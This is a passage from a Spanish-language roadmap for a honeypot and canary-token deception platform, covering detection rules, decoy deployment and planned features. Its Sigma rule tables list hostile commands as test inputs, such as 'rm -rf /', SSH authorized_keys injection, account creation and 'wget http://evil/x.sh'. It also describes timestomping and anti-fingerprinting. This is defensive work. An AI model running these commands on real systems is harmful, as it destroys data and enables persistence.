2. **Capa de "super-administrador" dentro de la misma app.** Un rol por encima de `global_admin` que ve
   varias instalaciones. Ventaja: reusa la base actual. Reto: mezcla el plano del cliente con el del
   proveedor; más difícil de aislar y de vender como producto separado.

**Criterio para decidir (cuando toque):** si el comprador quiere revender a su vez (multi-nivel), gana la
app aparte; si es una sola empresa gestionando sus propios despliegues, puede bastar la capa de
super-admin. **Pendiente de decisión de negocio + un diseño técnico corto antes de estimar en detalle.**

**Esfuerzo:** XL (subsistema nuevo). **Depende de:** RBAC activado en producción (P0 de arriba) y de un
canal de telemetría/salud por instalación. **Fecha objetivo:** por planificar (posterior a la venta).

### 🔴 REALIDAD documentada (no es bug)
- **fire-on-open 100% en Office NO es alcanzable** (bloqueo de contenido remoto / Vista
  Protegida; ni Thinkst lo logra). Los tipos que **siempre disparan**: web tokens (al cargar
  URL/imagen), **DNS** (al resolver), **credenciales** (al usarse → `decoy_reuse`). La UI ya
  es explícita por tipo. Documentos = viewer-dependiente (Word con contenido remoto sí;
  macOS Preview no; PDF `/OpenAction` sólo Adobe).

### ⏳ PENDIENTE — HTTPS/TLS para el callback de canarios (P1, deploy-hardening)
**Objetivo:** que los documentos-cebo llamen a casa por **HTTPS con certificado de confianza**,
subiendo la tasa de disparo (menos bloqueo por EDR/proxies corporativos) y habilitando la
captura **off-site**. NO bloquea nada: el circuito ya dispara+alerta sobre HTTP en LAN (verificado
E2E, commit `329e9f1`; ver `docs/CANARY_ALCANZABILIDAD.md`). Infra a medias: `ui/nginx-prod.conf`
ya tiene `443 ssl` + la ruta `/canary/`; falta el **aprovisionamiento del cert** y volverlo toggle.

**Matiz clave (decide el diseño):** en el callback de un documento, HTTPS **solo ayuda si el cert
es de confianza para la máquina que abre el doc**. Un cert **autofirmado puede ROMPER el beacon**
(Word/EDR rechazan el fetch por validación) → peor que HTTP a la IP LAN. Por eso se elige por escenario:

- **LAN enterprise con CA interna (AD/PKI):** emitir cert de esa CA para el appliance y servir
  `https://appliance.cliente.local` por nginx :443. Ideal enterprise. Implementación = dejar caer
  `server.crt/key` en `./certs/` (ya montado en prod) + fijar `TARTARUS_CANARY_BASE_URL=https://…`.
- **LAN sin CA interna:** quedarse en **HTTP a la IP** (lo actual). Autofirmado NO, rompe el beacon.
- **Off-site / público (doc exfiltrado):** **Cloudflare Tunnel** → `https://canary.tudominio.com`
  con cert público automático, sin abrir puertos ni gestionar certs. **Vía recomendada** (resuelve
  HTTPS + off-site de un golpe). Alternativa: host público + Let's Encrypt (certbot/ACME), más ops.

**Cómo se incorpora (tareas cuando toque):**
1. Servicio opcional `docker-compose.canary-tls.yml` con `cloudflared` (o companion certbot).
2. Extender `GET /canary-tokens/base-url` para **avisar si la base es `http://` y no es localhost**
   (empujar a HTTPS), análogo al aviso de localhost ya existente.
3. Doc de despliegue por vía de cert (ya hay receta de túnel en `docs/CANARY_ALCANZABILIDAD.md`;
   añadir la de CA interna y certbot).
4. `verify_canary_open.py` ya sigue la URL del documento → valida sobre HTTPS sin cambios.

**Gatillo (cuándo hacerlo):** en el hito de endurecimiento para despliegue / **primer engagement real**,
cuando (a) vas a un cliente enterprise con PKI → cert de CA interna, o (b) necesitas capturar aperturas
**fuera** de la red del cliente → Cloudflare Tunnel. Prioridad **P1**, esfuerzo **S–M** (mayormente ops/doc).

### ⏳ PENDIENTE — Notificaciones (P2, no urge)
- **Canal SMS** (Twilio: SID + token + from; falta `_send_sms` en `notifier.py`).
- **Remitente dedicado "Tartarus IQSEC"** (cuenta real) en vez de la de prueba
  `inhoboris@gmail.com` (destinatario actual `ivan.huerta@iqsec.com.mx`).
- **Selector de zona horaria en la UI** de ajustes de notificación (backend ya listo:
  `POST /notifications/config {"timezone"}`, default `America/Mexico_City`).

### ⏳ PENDIENTE — Tier G (deploy UX Beelzebub; Fase 1 hecha `e77c007`)
- **G-2 Hub de despliegue unificado** que REEMPLACE el wizard de 1342 líneas (servicios
  honeypot + sensores remotos + deception/tokens en un grid) — P1, L.
- **G-3 Switch on/off** de servicios Beelzebub desde la UI — P1, M.
- **G-4 Selección de key LLM por honeypot** desde la UI — P1, M.

### ⏳ PENDIENTE — Tier F
- **TF-14 Session Correlation asistida por IA** (resumen / hipótesis / TTPs del atacante con
  la API de IA) — futuro, P2, M.

### ⏳ PENDIENTE — Roadmap base (Tiers 1–6 + E, reconciliado)
- **HECHO** lo de Tier F (13/13, PR #12) y Tier G Fase 1 (Honeypot Services estilo Thinkst).
- Sigue **PENDIENTE**: detección MITRE 100%, **PhantomFS** endpoint, **laboratorio RPi 5**,
  **paridad Thinkst** completa, **LLM local (Ollama)**, multi-tenancy MSSP avanzado.
  El detalle por ítem vive en las secciones §1–§N de este mismo documento (abajo).

---

## 1. ESTADO ACTUAL

**Baseline del roadmap (7 jul 2026):**

| Métrica | Valor del roadmap | Meta |
| --- | --- | --- |
| Reglas Sigma | 90 | 106 (+16) |
| Reglas YARA | 24 archivos / 80+ reglas | mantener + AD/ICS |
| MITRE ATT&CK con regla | 37/53 detectables (70%) | 53/53 (100%) |
| OWASP Top 10 2025 | 7/8 (87.5%) | 8/8 (100%) |
| Protocolos monitoreados | 12 (red) | 12 red + 1 sensor endpoint (PhantomFS) |
| Deception de endpoint/filesystem | inexistente | PhantomFS integrado |
| Tipos de Canary Token | 14 | ~30 (paridad Thinkst) |
| Breadcrumbs | inexistente | 11 tipos |
| Personalities | protocolos sueltos | catálogo ~50 |
| Multi-tenancy (MSSP) | mono-tenant | Flocks + RBAC 3 roles |
| Tests | 342 passing | mantener verde |

**Estado REAL verificado en código (Claude, 7 jul 2026) — por delante del baseline del roadmap:**
- Tests: **526 recolectados** (`python3 -m pytest tests/ --co`).
- Reglas Sigma: **391 archivos .yml** en `engine/rules/sigma/` (subdirs por táctica MITRE ta0001–ta0043, owasp/, tartarus/, artifacts/…).
- Reglas YARA: **30 archivos .yar**.
- `engine/main.py`: **295 líneas** (límite 600).
- Módulos engine: **~70**.
- Docker: al momento solo `beelzebub`, `scanner`, `icmp-canary` arriba.
- Entorno: `python3` Homebrew 3.14.0 (no venv; `python` a secas no existe).

> Antes de dar por buenas las metas Sigma/MITRE del roadmap, reconciliar el conteo real (391 archivos) vs el mapa MITRE — puede que varias de las 16 reglas "faltantes" ya existan bajo otra taxonomía. **Acción previa a T1:** auditar cobertura MITRE real con `GET /detections/rules` y el mapa de tácticas.

**Diagnóstico:** plataforma madura en red, analítica, detección y reportería VRA. Huecos reales: (a) técnicas MITRE capturadas sin regla dedicada, (b) cero deception de endpoint/disco Windows, (c) features de campo (RPi 5, catch-all, malware capture) sin desplegar, (d) falta el modelo de operación como servicio (multi-tenancy, breadcrumbs, tokens ampliados, personalities, UX de triage).

---

## 1.6 ⭐ PENDIENTES MAESTRO (ago-2026) — no perder el hilo

> **Registro vivo de TODO lo abierto** (a petición del usuario, para no perder el hilo cuando nos
> enfocamos en un tema). Fuente: sesiones de ago-2026. Ver memoria `backlog-cebos-y-ui.md` y
> `tierf-completo-9-bloqueado.md`. Orden = prioridad aproximada.

### 🔴 P0 — Épico "Consola de Canarios" (plan aprobado ago-08; en curso)
- **Fase A — circuito de disparo garantizado + probado:** (1) **xlsx→imagen externa** (hoy hyperlink NO
  dispara al abrir); (2) **wire `register_decoy` a TODOS los cred** (hoy solo aws-keys/slack-api) con
  secreto único por-plant + recargar reglas; (3) verificar que un hit `decoy_reuse` (critical) eleve el
  riesgo → `notifier.send`; (4) `TARTARUS_CANARY_BASE_URL` LAN alcanzable; (5) matriz de disparo por tipo.
  **Realidad honesta:** fire-on-open 100% en Office NO es posible (viewer-dependiente); siempre disparan
  web/DNS/cred-en-uso.
- **Fase B — modelo de despliegue:** `canary_tokens` + `deployment_method`/`status`/`reported_path`/
  `deployed_at`/`aged_date` + endpoints (`PATCH`).
- **Fase C — consola-completo:** `#canarySection` con generar por tipo, método de despliegue, timestomp,
  estado, ruta reportada editable (los escenarios: USB/manual nuestro, o enviado por correo y el cliente
  instala + nosotros registramos la ruta que reporte).
- **Fase D — despliegue asistido:** bundle descargable (zip + `plantar.*` con timestomp) + **enviar cebos
  por correo** al cliente (reusar SMTP del notifier).

### 🟠 P1 — Notificaciones (base hecha; faltan mejoras)
- **Canal SMS** (Twilio: SID/token/from + `_send_sms` en `notifier.py`) — pospuesto por el usuario.
- **Remitente dedicado "Tartarus IQSEC"** (hoy cuenta de prueba `inhoboris@gmail.com`; destino
  `ivan.huerta@iqsec.com.mx`).
- **Selector de zona horaria en la UI** de ajustes de notificación (backend listo: `POST
  /notifications/config {"timezone"}`, default CDMX; hoy forzado a CDMX vía `fmtTime`).

### 🟠 P1 — Tier G (deploy UX estilo Thinkst; Fase 1 hecha `e77c007`)
- **G-2 hub unificado** que REEMPLACE el Deploy Wizard de 1342 líneas (servicios honeypot + sensores
  remotos + deception en un grid).
- **G-3 switch on/off** de servicios Beelzebub.
- **G-4 selección de key LLM por honeypot** desde la UI.

### 🟡 P2 — IA / análisis
- **TF-14 Session Correlation asistida por IA** (resumen del atacante, hipótesis de TTPs/objetivo,
  siguiente paso, con citación a eventos) — consumidor de la "API de IA" del engine.
- **LLM local Ollama** (Tier 5.2) para honeypot + generación de decoys sin llamada externa.

### 🟡 P2/P3 — Roadmap de producto pre-existente (Tiers 1–6, aún abiertos)
- **T1 Detección:** MITRE ATT&CK 100% (hoy ~70%), OWASP 8/8, reglas AD/ICS. Auditar cobertura real (391
  reglas) vs el mapa antes de "faltantes".
- **T2 PhantomFS:** deception de endpoint/filesystem Windows (inexistente).
- **T3:** features avanzados de captura (catch-all, malware capture).
- **T4:** laboratorio Raspberry Pi 5 (field deployment).
- **T5:** diferenciación de mercado; **T6:** paridad enterprise vs Thinkst (tokens ~30, breadcrumbs 11,
  personalities ~50, multi-tenancy MSSP avanzado).

### ✅ Hecho reciente (para contexto, no perder de vista lo cerrado)
- Tier F 13/13 (aislamiento MSSP `flock_scope`, guard de secretos, detección concisa, filtros
  data-driven, Attack Map, observed hosts, editor de personas + SSH-LLM). #9 notificaciones E2E
  (email+Telegram). Tier G Fase 1 (Honeypot Services). Notificaciones enriquecidas + CDMX. Borrado de
  tokens (UI). Formatos reales de cebos + timestomp (`scripts/deploy_canary_tokens.py`).

---

## 1.5 TIER 0 — SANEAMIENTO / DEPLOYMENT READINESS · P0 (PUERTA)

> **Añadido 2026-08-07** tras una auditoría del *proceso de trabajo* (no del código) + la exploración
> del despliegue de campo. **Es una puerta de calidad:** por decisión del usuario, **ninguna feature
> nueva de los Tiers 1–6/E se retoma hasta que los 11 ítems estén "sanos"** — medido por un health-gate
> re-ejecutable `scripts/audit_gate.sh` que debe salir `exit 0`. El loop es: `gate → arreglar top-FAIL
> → re-gate → … hasta verde`. Sustituye al obsoleto `scripts/verify_features.sh` (v0.5).

| ID | Sev | Objetivo (criterio de "sano" que checa el gate) | Cómo | Esf. |
| --- | --- | --- | --- | --- |
| T0-1 | 🔴 P0 | **Ingesta no ciega (#10):** con sensores activos y 0 eventos en N min, `/health` reporta `degraded/ingestion_stale` y el consumer se reconecta solo. | Check de frescura (`consumer:events_total`/edad último evento) en `main.py:201`; worker de reconexión AMQP + auto-restart Beelzebub. | M |
| T0-2 | 🔴 P0 | **Telemetría de campo real:** un evento simulado de "sensor de campo" (HMAC) aterriza en `events` y aparece en el feed vía UN transporte autenticado. | Crear `POST /ingest/sensor` (HMAC) **o** AMQP-over-Tailscale; `/events/webhook` no existe hoy (los Pi dan 404); unificar los 3 composes de campo; corregir `push-to-rpi.sh:77-80`. | M |
| T0-3 | 🟠 P0 | **Aislamiento entre flocks probado:** test de integración vs Postgres real, 2 flocks con eventos cruzados, asserts de que A jamás ve filas de B. Verde en CI. | `tests/integration/test_flock_isolation.py` con el Postgres que `ci.yml` ya levanta. Hoy los 835 tests son unit/mock. | M |
| T0-4 | 🟠 P0 | **Skills al día:** 0 skills `tartarus-*` describen arquitectura obsoleta; sin duplicación (una sola ubicación). | Refrescar vigentes vs v0.6.x, retirar muertas. Hoy: 16 en `.claude/skills` + 16 en `~/.claude/skills`, 0 conocen flock/ack/two-level. | M |
| T0-5 | 🟡 P0 | **Un solo cerebro canónico:** la auto-memory apunta a la wiki como fuente de verdad; sin hechos duplicados. | Puntero en `MEMORY.md` → `Wikis/wiki-tartarus`; podar duplicado. | S |
| T0-6 | 🟡 P0 | **Definición de "desplegable":** existe `deploy-checklist` que gatea en T0-1/T0-2/T0-3 y el gate la referencia. | `wiki/deploy-checklist.md` + runbook de campo mínimo. | S |
| T0-7 | 🟡 P0 | **Wiki con memoria operativa:** existe postmortem del #10 y página release de v0.6.2. | `wiki/postmortems/0001-ingesta-amqp.md` + `wiki/releases/v0.6.2.md`. | S |
| T0-8 | 🟡 P0 | **Conteo de detección honesto:** UI/endpoint distingue reglas "cargadas" vs "aplicables a honeypot"; no se anuncia 424 a secas. | `applicable_count` en `/detections/rules` + etiqueta UI. Hoy 424 cargadas / ~89 aplican (resto forenses `product:windows` inertes). | S |
| T0-9 | ⚪ P0 | **Sin fricción git en la wiki:** `maintenance.auto=false`, sin locks huérfanos. | `git config` + limpieza. | S |
| T0-10 | ⚪ P0 | **Firma de agentes con convención:** documentada en `AGENTS.md`. | Fijar convención (claude vs antigravity). | S |
| T0-11 | ⚪ P0 | **Clean-slate reproducible:** `POST /admin/reset` (RBAC admin) o decisión documentada. | Endpoint de reset o nota en runbook. | S |

**Salida Tier 0:** `scripts/audit_gate.sh` = `exit 0`. Recién ahí se retoman features de otros Tiers.

---

## 2. TIER 1 — DETECCIÓN (cerrar cobertura MITRE + OWASP) · P0–P2

Objetivo: pasar de **70% → 100%** MITRE detectable con 16 reglas Sigma + 1 OWASP A08.

### 2.1 Patrón para escribir/probar una regla Sigma en Tartarus
- **Ubicación:** `engine/rules/sigma/tartarus/<nombre>.yml` (o `mitre/<Txxxx>.yml` si mapea 1:1).
- **Motor:** las evalúa `sigma_lite.py` en `consumer.py`. Campos del evento: `protocol`, `command`, `source_ip`, `username`, `password`, `http_path`, `user_agent`, `risk_score`, `timestamp`.
- **YAML mínimo:** `title`, `id` (UUID), `status`, `level`, `logsource`, `detection` (selection + condition), `tags` (`attack.txxxx`), `falsepositives`.
- **Registro:** aparece vía `GET /detections/rules` al reiniciar el consumer.
- **Validación:** evento sintético que dispare → `GET /detections` + marker en Activity Timeline + fila en Detection Rules. Añadir caso a `tests/test_sigma_rules.py` con evento positivo **y** negativo.

### 2.2 Reglas P0 — Discovery e Impact
| # | Regla / archivo | MITRE | Cómo | Validación | Esf. |
| --- | --- | --- | --- | --- | --- |
| 1 | `tartarus/discovery_host_enum.yml` | T1082/T1016/T1049/T1057/T1069/T1033 | selection con `command` ∈ {uname, hostname, ifconfig, ip addr/a, netstat, ss -, ps aux, id, groups, whoami /all}. level high | `uname -a` → tag attack.t1082 | S |
| 2 | `tartarus/impact_data_destruction.yml` | T1485 | `command` ~ rm -rf, dd if=/dev/zero|urandom, shred, mkfs, wipefs, > /dev/sda. level critical | `rm -rf /` → critical | S |
| 3 | `tartarus/impact_service_stop.yml` | T1489 | `command` ~ systemctl stop, service * stop, kill -9, pkill, shutdown, reboot, init 0. level high | `systemctl stop nginx` | S |
| 4 | `tartarus/persistence_ssh_authorized_keys.yml` | T1098.004 | `command` ~ authorized_keys + {echo, >>, cat >, tee}. level high | `echo 'ssh-rsa...' >> ~/.ssh/authorized_keys` | S |
| 5 | `tartarus/persistence_create_account.yml` | T1136 | `command` ~ adduser, useradd, net user * /add, New-LocalUser. level high | `useradd hacker` | S |

### 2.3 Reglas P1 — Defense Evasion + C2
| # | Regla / archivo | MITRE | Cómo | Validación | Esf. |
| --- | --- | --- | --- | --- | --- |
| 6 | `tartarus/evasion_timestomp.yml` | T1070.006 | `command` ~ touch -t/-d/-r, PS `.LastWriteTime =`. level high | `touch -t 202001010000 file` | S |
| 7 | `tartarus/evasion_file_deletion.yml` | T1070.004 | `command` ~ rm, unlink, srm, del /f, Remove-Item -Force (excluir lo ya cubierto por Data Destruction). level medium | `rm evidence.log` | S |
| 8 | `tartarus/c2_encrypted_channel.yml` | T1573 | Depende de HASSH (4.1). Dispara si `hassh` ∈ lista de herramientas ofensivas (Hydra, Paramiko, Medusa). level high | SSH con HASSH de Hydra | M |
| 9 | `tartarus/c2_nonstandard_port.yml` | T1571 | Enriquecer con `dest_port`; dispara si protocolo ≠ puerto esperado. level medium | "SSH" en puerto 4444 | S |
| 10 | `tartarus/c2_proxy_headers.yml` | T1090 | headers ~ X-Forwarded-For sospechoso, Via:, TOR exit (cruzar TI). level medium | header proxy encadenado | S |

### 2.4 Reglas P2 — Completar cobertura
| # | Regla / archivo | MITRE/OWASP | Cómo | Validación | Esf. |
| --- | --- | --- | --- | --- | --- |
| 11 | `tartarus/execution_wmi.yml` | T1047 | `command` ~ wmic, Invoke-WmiMethod, Get-WmiObject, wmiexec. level high | `wmic process call create` | S |
| 12 | `tartarus/exfil_web_service.yml` | T1567 | HTTP POST content_length>1024 a paths upload o pastebin/anonfiles/transfer.sh. level high | POST 5KB a /upload | S |
| 13 | `tartarus/persistence_boot_logon.yml` | T1547 | `command` ~ .bashrc, .profile, .bash_profile, /etc/rc.local, crontab -e. level high | `echo cmd >> ~/.bashrc` | S |
| 14 | `owasp/deserialization.yml` | A08 / T1190 | `command`/http ~ ObjectInputStream, rO0AB (Java b64 magic), PHP O:/unserialize, pickle, __reduce__. level critical. Cierra 8/8 OWASP | payload rO0AB... → critical | M |
| 15 | `tartarus/discovery_remote_systems.yml` | T1018 | `command` ~ arp -a/-n, ping sweep (for i in $(seq), nmap -sn. level medium | `arp -a` | S |
| 16 | `tartarus/evasion_masquerading.yml` | T1036 | doble extensión (.pdf.exe), binarios legítimos en rutas raras (/tmp/svchost), unicode RTL. level high | `mv shell /tmp/systemd` | S |

**Salida Tier 1:** MITRE 53/53 detectables (100%), OWASP 8/8. Actualizar matriz del reporte y count `GET /detections/rules` a 106.

---

## 3. TIER 2 — INTEGRACIÓN PhantomFS (deception de endpoint) · P0–P1

PhantomFS v1.1.1-beta (1-jul-2026): honeypot de filesystem Windows (ProjFS) que proyecta archivos señuelo en memoria y emite Event ID 1001-1004 + Toast al abrirlos. Se integra reutilizando la arquitectura de sensores remotos. La release upstream solo escribe Windows Event Log + Toast (sin webhook/SIEM), así que el forwarder lo construimos nosotros.

- **3.1 P0.1 — Forwarder Event Log → Tartarus (M, dep 3.3):** `phantomfs_forwarder.ps1` (scheduled task) suscrito al Application log (source=PhantomFS, Event ID 1001/1002) → JSON schema Tartarus `{protocol:"phantomfs", source_ip, command:<filename>, event_type:"decoy_file_read", phantom_event_id, sensor_id, timestamp, process_context}` → `POST /ingest/sensor`. Validación: abrir señuelo → evento en `GET /events` y Live Feed en <5s.
- **3.2 P0.2 — Sigma decoy access (S, dep 3.1):** `tartarus/phantomfs_decoy_access.yml`. selection protocol=phantomfs AND event_type=decoy_file_read. level critical. Tags t1083 + t1005. Reutiliza patrón de `canary_token_triggered.yml`. Validación: entra al Kill Chain en Discovery/Collection.
- **3.3 P0.3 — Ingesta sensor + UI (M):** `POST /ingest/sensor` (valida token, publica a RabbitMQ) + `POST /sensors/register` + heartbeat tipo `endpoint-windows`. UI sección 17 renderiza sensor Online/Offline/Degraded. Validación: Windows aparece como sensor; matar forwarder → Degraded.
- **3.4 P1.1 — Honey creds cruzados endpoint→red (M, dep 3.1/3.2) — DIFERENCIADOR:** sembrar el mismo valor de honey cred dentro de archivos señuelo PhantomFS con `trap_id` compartido; al detectar uso de la cred en SSH/FTP/MySQL, buscar `decoy_file_read` del mismo trap_id en N horas → kill_chain_trace multi-etapa (Discovery endpoint → Credential Access → Lateral Movement red). Validación: leer deploy_key.pem en Windows → usarla en honeypot SSH → un solo trace.
- **3.5 P1.2 — Decoy documents LLM (M, dep 5.2):** LLM (Ollama local) genera contenido realista → `<fileContentTemplates>` de PhantomFS. Endpoint `POST /deception/generate-decoy`.
- **3.6 P2.1 — Canary token #15 ProjFS (S, dep 3.3):** añadir tipo a sección 14 + `/canaries/*`.

**Lo que NO se toma de PhantomFS:** su GUI console (Canvas es superior), SMTP/Teams (ya hay 4 canales), CEF forwarding (ya hay TheHive + STIX/TAXII planeado).

---

## 4. TIER 3 — FEATURES AVANZADOS DE CAPTURA · P1–P2

- **4.1 HASSH fingerprinting (P1, M):** en `consumer.py`, calcular HASSH del handshake SSH (MD5 de algoritmos KEX/cipher/MAC del cliente). Guardar `hassh` en `events` + lookup de herramientas ofensivas. Habilita regla #8. Validación: Paramiko produce hassh estable.
- **4.2 Catch-all port listener (P1, L):** contenedor con iptables TPROXY redirigiendo rango no asignado a listener genérico → RabbitMQ `protocol=unknown`. `network_mode: host`. Validación: `nc honeypot 6666` genera evento.
- **4.3 Malware collection + sandbox (P1, L):** al matchear wget/curl download, guardar binario con SHA256, escanear con YARA, opcional sandbox. Tabla `captured_samples` + UI. Validación: `wget http://evil/x.sh` → binario + hash + veredicto YARA.
- **4.4 DNS honeypot (P1, M):** CoreDNS/listener DNS → RabbitMQ `protocol=dns`. Alimenta `dns_tunneling.yml`. Validación: query TXT anómala (iodine/dnscat).
- **4.5 STIX/TAXII export (P1, M):** `GET /export/stix` serializa IOCs a STIX 2.1; servidor TAXII 2.1 opcional. Reutiliza IOCs del reporte VRA.
- **4.6 GeoIP map Canvas (P2, M):** world map canvas con puntos por lat/lon (ya hay geoloc IP-API sección 16), mismo patrón que Attack Graph.
- **4.7 Suricata IDS (P2, L):** contenedor Suricata `network_mode: host` + ET Open; `eve.json` al consumer.
- **4.8 Session replay (P2, M):** player que reproduce cronológicamente eventos de una sesión (sección 12 ya agrupa sesiones).

---

## 5. TIER 4 — LABORATORIO RASPBERRY PI 5 (16GB) · P1

- **5.1 Docker ARM64 (M):** multi-stage Alpine/slim ARM64 para los 8 servicios. Objetivo ~3 GB / 13 GB libres. Validación: `docker compose up` con <3 GB en reposo.
- **5.2 LLM local Ollama + Qwen2.5:1.5B (M, dep 5.1):** contenedor Ollama ARM64 (~2 GB). Apuntar Beelzebub y decoy generation al Ollama local. Validación: respuesta LLM sin llamada externa.
- **5.3 Hardening de campo (M, dep 5.1):** NVMe SSD, cooling activo, rootfs read-only, WireGuard VPN de management, firewall restrictivo. Runbook.
- **5.4 Anti-detection hardening (CRÍTICO, M):** personalizar banners SSH/HTTP/FTP para no delatar Beelzebub; jitter de timing; variar versiones. Validación: `nmap -sV` y scripts anti-honeypot no lo marcan.
- **5.5 Scripts de ataque demo (P2, S):** brute force, recon multi-protocolo, kill chain completa para demos.

---

## 6. TIER 5 — DIFERENCIACIÓN DE MERCADO · P3
| Ítem | Objetivo | Cómo | Esf. |
| --- | --- | --- | --- |
| ICS/SCADA honeypots | Nicho industrial (Conpot) | Modbus/S7/BACnet + reglas Sigma industriales | L |
| Active Directory deception | Kerberos honey tokens (DCEPT) | Cuentas/SPN señuelo; detectar Kerberoasting/AS-REP | L |
| Plugin system | Honeypots de terceros | SDK para registrar honeypots externos a RabbitMQ | XL |
| Community hub | Reglas Sigma/YARA compartidas | Repo + import/export rulesets | M |
| Web app emulation | Vulns web realistas (Snare/Tanner) | Emulador de app vulnerable como bait HTTP | L |

---

## 7. TIER 6 — PARIDAD ENTERPRISE vs THINKST CANARY (MSSP) · P1–P3

Filosofía Thinkst: **alta fidelidad + cero ruido**. Cada alerta se resuelve leyendo 5–8 campos.

- **7.1 T6-1 — Multi-tenancy / "Flocks" (P1, XL) — EL SALTO ESTRATÉGICO:** entidad `flock` (tabla + `flock_id` FK en events/detections/sensors/canaries/honey_creds/kill_chain_traces); consumer estampa flock_id según sensor; **RBAC 3 roles** (Global Admin / Manager / Watcher); notificaciones por flock (4 canales segmentados); selector de Flock en header. Validación: Manager de Cliente-A no ve nada de B; alerta de A solo notifica a A. Dep: `/auth/*` con roles.
- **7.2 T6-2 — Breadcrumbs (P1, L):** router `/breadcrumbs/*` + generadores de los 11 tipos Thinkst (SSH key, PuTTY, FileZilla/WinSCP, shortcuts SMB/FTP/HTTP/HTTPS, .rdp). Regla clave: el tipo solo se ofrece si el honeypot destino tiene ese servicio activo. Correlación en kill_chain_traces. Validación: .rdp → abrir → conexión al honeypot RDP → alerta enlazada.
- **7.3 T6-3 — Tokens 14→30 (P1, L):** Lote A (alto valor/cero FP): Browser Cookie, Sensitive Command, MySQL Dump, WireGuard config. Lote B (cloud/identidad): Azure Login Cert, Entra ID Login, Slack API Key, SAML IdP. Lote C (web): Cloned Website/CSS, Fast/Slow Redirect, Custom Web Image, Mail Bug. Lote D (docs): Google Docs/Sheets, Custom Exe/Binary, Credit Card.
- **7.4 T6-4 — Personalities + IP-Stack Fingerprint (P1, L, dep T4-4):** catálogo `personalities/*.yml` (FortiGate, Palo Alto, Cisco, Synology, Jenkins, GitLab, SAP, Splunk, ESXi…). IP-Stack fingerprint (TTL/window/opciones TCP vía sysctl/iptables) para `nmap -O`. Selector en Deploy Wizard paso 2. Validación: `nmap -sV/-O` ve FortiGate.
- **7.5 T6-5 — Árbol de archivos industry-specific (P2, M, dep T2-5/T4-2):** `POST /deception/generate-filetree?industry=<it|finance|health>` con LLM → `<syntheticFileList>` PhantomFS y/o árbol SMB. Marcar archivos con Canarytoken embebido.
- **7.6 T6-6 — UX de alertas triage en segundos (P1, M):** Memo por canary/sensor; Related Incidents (contador por source_ip); Background Context (primera vez/recurrente); Reverse IP + TI inline; acciones one-click (Acknowledge, Ignore this IP, Copy link, View). Validación: alerta se resuelve sin abrir el JSON.
- **7.7 T6-7 — Consola enterprise MFA/WebAuthn + SAML SSO + Audit Trail (P2, L, dep T6-1):** WebAuthn 2FA, SAML 2.0 (Azure AD/Okta/Auth0), tabla `console_audit`.
- **7.8 T6-8 — Token Factory + mass deploy + dominios (P2, M, dep T6-1/T6-3):** token de alcance limitado; playbooks Ansible + PowerShell (SCCM/Jamf); custom token domains.
- **7.9 T6-9 — Graphview 3 columnas (P3, M):** vista Canvas determinista IP→evento→sensor/flock con resaltado de camino y colores por severidad.
- **7.10 T6-10 — Exclusiones heartbeat + auto-commission (P2, S, dep T6-1):** lista de exclusión del tráfico heartbeat/DNS; auto-commission por flock; Ignored IPs/Ports por flock.

---

## 7.7 TIER G — EXPERIENCIA DE DESPLIEGUE ESTILO THINKST (Beelzebub primero) · P1

> **Añadido 2026-08-07 (tarde), por feedback del usuario viendo la consola de Thinkst Canary.** El Deploy
> Wizard (`ui/src/js/wizard.js`, 1342 líneas, 5 pasos) es confuso; se quiere *elige qué desplegar y hazlo*,
> con conciencia de **qué API LLM usa** y un panel de **servicios desplegados**. Beelzebub es "lo clave".

- **G-1 Honeypot Services (Beelzebub) ✅ hecho (e77c007):** `GET /services` (resumen seguro, sin key) +
  sidecar `.tartarus-personas.json` (persona aplicada por servicio). Vista grid en Gestión: cada honeypot
  con su disfraz + badge LLM (provider/model o estático); panel de config por servicio (elegir persona
  filtrada por protocolo, editar prompt reusando #13b, aplicar → banner de restart). Awareness de API:
  LLM del engine (`/settings/ai`, todas las keys) vs LLM del honeypot (por servicio).
- **G-2 Hub de despliegue unificado ✅ hecho (11-ago):** la vista Gestión → "Despliegue" reúne Honeypots +
  Sensores remotos (`deploy_router`) + Deception/tokens. Primero deprecación segura (hub + wizard como "Modo
  avanzado"); luego **retiro TOTAL de `wizard.js`** con el despliegue de una sola pantalla `deploy_hub.js`
  (escenarios + perfiles de hardware como datos del hub). Ver la épica Beelzebub arriba.
- **G-3 Switch on/off de servicios (P2, M):** habilitar/deshabilitar un servicio Beelzebub (mover su YAML
  dentro/fuera del dir cargado) + restart. Hoy los 6 están siempre activos.
- **G-4 Selección de key LLM por honeypot (P2, S–M):** hoy el honeypot usa la key del YAML; permitir
  elegir proveedor/key por servicio desde la UI (con awareness de las cargadas).
- **G-5 Notificaciones enriquecidas ✅ hecho + futuro:** las alertas ahora son legibles y contextuales
  (cebo abierto → nombre, formato/extensión, **ruta de despliegue**, quién lo abrió IP+user-agent, geo
  best-effort de IPs públicas, hora legible; honeypot → servicio/acción/MITRE). La ruta se registra al
  desplegar (`planted_location` en `/canary-tokens/document` + prompt de ruta en el generador de docs de
  la UI). **Hora en zona local** (default **America/Mexico_City / CDMX**, configurable vía
  `NOTIFY_TIMEZONE` o `POST /notifications/config {"timezone"}`). **Futuro (no urge):** (a) selector de
  **zona horaria en la UI** de ajustes de notificación (backend ya listo); (b) cuenta de correo
  **dedicada "Tartarus IQSEC"** como remitente en vez de la de prueba `inhoboris@gmail.com`; (c) canal
  **SMS** (Twilio) cuando se pida.
- **G-6 Despliegue de cebos + timestomp (P1) — parcial:** `scripts/deploy_canary_tokens.py` genera y
  DESPLIEGA un cebo de cada tipo (docs reales docx/pdf/xlsx con web-bug vía `/document`; creds vía
  `plant_token`; web tokens con su URL) a una carpeta, los registra, y les **envejece la fecha**
  (timestomp `os.utime` + `SetFile` en macOS) a ~1.5–2.5 años atrás con mes aleatorio, para que no se
  vean recién plantados y pasen desapercibidos al atacante. Validado: 24/24 tipos disparan alerta.
  **OBJETIVO (usuario, 2026-08-08): llevar esto a la UI de TARTARUS** — generar/desplegar cada tipo de
  forma fácil y **manipular la fecha (timestomp) desde la interfaz**. Falta: endpoint que devuelva el
  contenido de los cebos de credencial (hoy solo `/document` devuelve bytes; los de plantilla se
  escriben server-side), un "bundle de despliegue" descargable con la fecha elegida, y controles en la UI.

## 7.5 TIER E — SENSORES, DESPLIEGUE Y CONSOLA (referencia Thinkst Canary) · P1

> **Añadido 2026-08-07, ampliado tras evaluar Thinkst Canary** (POC IQSEC, red OT ~88 unidades,
> SOC-IA = Cortex XSIAM). Modelo objetivo: **cebos dentro de los activos reales; sensores al lado en
> la red** (el sensor nunca es agente dentro del SO de producción). Se construye tras cerrar el
